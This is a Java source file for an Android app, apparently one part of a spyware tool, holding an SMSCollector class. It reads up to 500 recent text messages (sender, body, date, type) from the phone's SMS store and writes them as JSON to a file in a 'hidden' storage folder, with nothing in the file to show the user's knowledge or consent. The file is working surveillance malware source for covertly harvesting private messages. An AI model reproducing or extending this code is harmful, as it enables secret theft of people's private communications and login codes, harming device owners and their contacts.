package com.alzahra.collectors;

import android.content.Context;
import android.database.Cursor;
import android.provider.Telephony;
import android.util.Log;

import com.alzahra.storage.HiddenStorageManager;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.io.FileOutputStream;

public class SMSCollector {
    
    private static final String TAG = "SMSCollector";

    public static void collect(Context context) {
        try {
            JSONObject data = new JSONObject();
            JSONArray messages = new JSONArray();
            
            String[] projection = {
                Telephony.Sms.ADDRESS,
                Telephony.Sms.BODY,
                Telephony.Sms.DATE,
                Telephony.Sms.TYPE
            };
            
            Cursor cursor = context.getContentResolver().query(
                Telephony.Sms.CONTENT_URI,
                projection,
                null,
                null,
                Telephony.Sms.DATE + " DESC LIMIT 500"
            );
            
            if (cursor != null && cursor.moveToFirst()) {
                int addressIndex = cursor.getColumnIndex(Telephony.Sms.ADDRESS);
                int bodyIndex = cursor.getColumnIndex(Telephony.Sms.BODY);
                int dateIndex = cursor.getColumnIndex(Telephony.Sms.DATE);
                int typeIndex = cursor.getColumnIndex(Telephony.Sms.TYPE);
                
                do {
                    JSONObject msg = new JSONObject();
                    msg.put("address", cursor.getString(addressIndex));
                    msg.put("body", cursor.getString(bodyIndex));
                    msg.put("date", cursor.getLong(dateIndex));
                    msg.put("type", cursor.getInt(typeIndex));
                    messages.put(msg);
                } while (cursor.moveToNext());
                
                cursor.close();
            }
            
            data.put("type", "sms");
            data.put("count", messages.length());
            data.put("timestamp", System.currentTimeMillis());
            data.put("messages", messages);
            
            File outputFile = new File(HiddenStorageManager.getHiddenFolder(context), "sms_data.json");
            FileOutputStream fos = new FileOutputStream(outputFile);
            fos.write(data.toString().getBytes());
            fos.close();
            
            Log.d(TAG, "Collected " + messages.length() + " SMS messages");
            
        } catch (Exception e) {
            Log.e(TAG, "SMS collection failed", e);
        }
    }
}
